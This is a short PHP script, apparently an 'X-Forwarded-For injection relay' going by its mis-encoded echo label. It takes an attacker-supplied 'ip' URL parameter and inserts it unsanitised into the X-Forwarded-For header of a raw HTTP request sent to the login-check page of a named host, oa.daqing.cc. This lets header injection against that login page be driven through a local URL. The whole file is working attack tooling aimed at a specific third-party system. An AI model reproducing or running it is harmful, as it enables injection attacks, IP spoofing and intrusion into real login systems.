<?php
//http://localhost/transfer.php?ip=1
echo "x-forworaded-for ×¢ÈëÖÐ×ª";
$clientip = $_GET['ip'];
//$clientip = "127.0.0.1";
echo $clientip."\n";
$host="oa.daqing.cc";
$url="/logincheck.php";
 
$ret = php_request($url);

echo $ret."\n";
 
function php_request($url,$data='',$cookie=''){
	global$host,$clientip;
	 
	$method=$data?'POST':'GET';
	 
	$packet=$method." ".$url." HTTP/1.1\r\n";
	$packet.="Accept: */*\r\n";
	$packet.="User-Agent: Mozilla/4.0 (compatible; MSIE 6.00; Windows NT 5.1; SV1)\r\n";
	$packet.="Host: $host\r\n";
//	echo $packet."\n";
	$packet.="X-Forwarded-For: $clientip\r\n";
	echo $packet."\n";
	$packet.=$data?"Content-Type: application/x-www-form-urlencoded\r\n":"";
	$packet.=$data?"Content-Length: ".strlen($data)."\r\n":"";
	$packet.=$cookie?"Cookie: $cookie\r\n":"";
	$packet.="Connection: Close\r\n\r\n";
	$packet.=$data?$data:"";
	 
	$fp=fsockopen(gethostbyname($host),8000);
	if(!$fp){
		echo'No response from '.$host;die;
	}
	fputs($fp,$packet);
	 
	$resp='';
	 
	while($fp&&!feof($fp))
	$resp.=fread($fp,1024);
	 
	return$resp;
}
 
?>
